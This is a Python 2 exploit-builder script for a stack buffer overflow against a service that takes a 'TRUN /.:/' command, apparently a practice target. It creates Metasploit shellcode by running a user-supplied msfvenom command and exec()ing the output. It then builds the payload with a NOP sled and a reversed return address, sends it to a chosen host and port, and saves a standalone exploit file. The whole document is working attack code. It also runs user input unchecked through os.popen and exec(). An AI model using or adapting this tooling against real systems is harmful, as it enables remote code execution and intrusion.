#!/usr/bin/env python
import sys, os, socket

host = str(raw_input("Host: "))
port = int(raw_input("Port: "))

prefix = 'TRUN /.:/'
suffix = ''

print "******************************"
print "Verify the prefix and suffix"
print "[+]Prefix: " + prefix
print "[+]Suffix: " + suffix
print "******************************"

offset = int(raw_input("\nEnter EIP offset from step 3: "))
print "Enter the full command of the msf payload to generate"
payload = raw_input("Command: ")
print "[+] Generating payload"
payload = os.popen(payload).read()

buf = ""		#This is filled with our MSF payload
exec(payload)
buf = "\x90"*16 + buf	#Add NOP slide, wheeee!

exploit = ""

insertBefore = False
if len(buf) > offset:
	print "[*] Payload longer than buffer. Attempting to add payload after offset"
else:
	print "Insert payload before or after overflow? (b/a)"
	while True:
		answer = raw_input(">> ").lower()
		if answer == "b":
			insertBefore = True
			break
		elif answer == "a":
			 break

print "Please specify an address to jump to (Big Endian)"

evil = ""
while True:
	jump = raw_input("JMP: ")
	jump.replace("0x", "")
	jump.replace("\\x","")
	evil = jump

	if len(jump) == 8:
		address = ""
		for i in range(4):		#Convert to usable bytes
			address += chr(int(jump[i*2:(i+1)*2],16))
		jump = address
		break
	print "Not correct length for a 32-bit address. Try again"

if not insertBefore:	#Here we change it to Little Endian for you. That's always a pain to do manually.
	exploit = prefix + "A"*offset + jump[::-1] + buf + suffix
else:
	exploit = prefix + buf + "A"*(offset - len(buf)) + jump[::-1] + suffix

evil.replace("0x","\\x")
if len(evil) == 8:		#If we need to insert backslashes for our output
	evil = "\\x" + '\\x'.join(evil[i:i+2] for i in range(0, len(evil), 2))

evil = "".join(reversed([evil[i:i+4] for i in range(0, len(evil), 4)]))	#Little Endian

print "Exploit ready. Launch? (y/n)"
while True:
	answer = raw_input(">> ").lower()
	if answer == "y" or answer == "n":
		break

if answer == "n":
	pass
else:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	print "[+] Sending exploit"
	s.connect((host, port))
	data=s.recv(1024)
	s.send(exploit)
	s.close()
	print "[*] Exploit Sent!"

saveExploit = True
if saveExploit:
	print "[+] Saving final exploit as bof-exploit.py"
	outfile = "#!/usr/bin/python\nimport socket\n" + payload
	outfile += "buf = \"\\x90\"*16 + buf"		#NOP Sled
	if insertBefore:
		outfile += "\nexploit = \"" + str(prefix) + "\" + buf + \"A\"*(" + str(offset) + "-len(buf)) + \"" + evil + suffix + "\""
	else:
		outfile += "\nexploit = \"" + str(prefix) + "\" + \"A\"*" + str(offset) + " + \"" + evil + "\" + buf + \"" + str(suffix) + "\""
	outfile += "\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nprint \"[+]Sending exploit...\""
	outfile += "\ns.connect((\"" + host + "\"," + str(port) + "))\n"
	outfile += "data=s.recv(1024)\ns.send(exploit)\ns.close()"
	file = open("bof-exploit.py", "w")
	file.write(outfile)
	file.close()
